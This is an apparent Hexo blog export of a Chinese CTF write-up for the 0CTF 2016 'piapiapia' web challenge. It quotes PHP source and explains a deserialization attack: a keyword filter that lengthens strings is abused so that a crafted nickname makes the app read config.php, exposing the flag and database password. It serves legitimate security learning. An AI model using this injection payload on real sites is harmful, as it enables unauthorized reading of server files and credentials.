基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x02 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/images/1.png) 传入参数\n\n访问profile.php\n\n![2](/images/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","source":"_posts/buuoj刷题记录1.md","raw":"---\ntitle: buuoj刷题记录1\ndate: 2019-12-23 19:44:18\ntags: \n - ctf\n - buuoj\n - web\n - 0CTF\n---\n\n## [0CTF 2016]piapiapia\n\n### 0x01 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x02 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/images/1.png) 传入参数\n\n访问profile.php\n\n![2](/images/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","slug":"buuoj刷题记录1","published":1,"updated":"2019-12-27T03:48:12.874Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4nmczc90000207eemtn5tbt","content":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x01-基础\"><a href=\"#0x01-基础\" class=\"headerlink\" title=\"0x01 基础\"></a>0x01 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/images/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/images/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x01-基础\"><a href=\"#0x01-基础\" class=\"headerlink\" title=\"0x01 基础\"></a>0x01 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>","more":"<h3 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span 